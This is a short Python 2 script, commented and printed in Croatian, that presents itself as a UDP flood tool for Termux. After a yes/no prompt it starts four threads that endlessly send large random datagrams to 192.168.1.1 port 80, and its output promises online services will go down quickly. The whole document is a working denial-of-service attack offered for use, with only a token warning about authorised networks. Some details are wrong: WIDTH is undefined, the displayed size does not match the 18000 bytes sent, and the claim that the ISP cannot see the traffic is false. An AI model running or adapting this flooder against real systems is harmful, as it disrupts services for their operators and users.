# UDP FLOOD SKRIPTA #
# -*- coding: utf-8 -*-
import sys 
import os
import time
import random
import threading
import socket

#Postavke
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(18000)
# Boje
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
WHITE   = "\033[97m"
RESET   = "\033[0m"
BOLD    = "\033[1m"

os.system("clear") 

print CYAN + "UDP Flood - Termux Lite Verzija" + RESET
print " "
print "Koristi samo na " + RED + "ovlaštenim mrežama!" + RESET
print "Napravio  > " + RED + "HunteR_" + RESET

ip = "192.168.1.1"
port = 80
print " "
pitanje = raw_input("Zeliš li nastaviti? " + YELLOW + "[y/n]: " + RESET)
sent = 0
if pitanje.lower() == "y":
    print " "
    print "Mreža se flooda velikim UDP datagramima, očekivan prestanak rada online servisa u jako kratkom vremenu."
    print " "
    text = "Veličina UDP datagrama - "
    value = "64.000B"
    print "||" + (text + value).center(WIDTH).replace(value, CYAN + value + WHITE) + "||"

    text = "IP - "
    value = "192.168.1.1:80"
    print "||" + (text + value).center(WIDTH).replace(value, CYAN + value + WHITE) + "||"

    text = "ISP NE VIDI OVAJ PROMET!"
    print "||" + (CYAN + text + WHITE).center(WIDTH) + "||"
    def sender():
        while True:
            sock.sendto(bytes, (ip, port))

    threads = []

    for i in range(4):
        t = threading.Thread(target=sender)
        t.daemon = True
        t.start()
        threads.append(t)

    while True:
        pass
else:
    print "Prekinut nastavak. Izlazim..."
    exit()
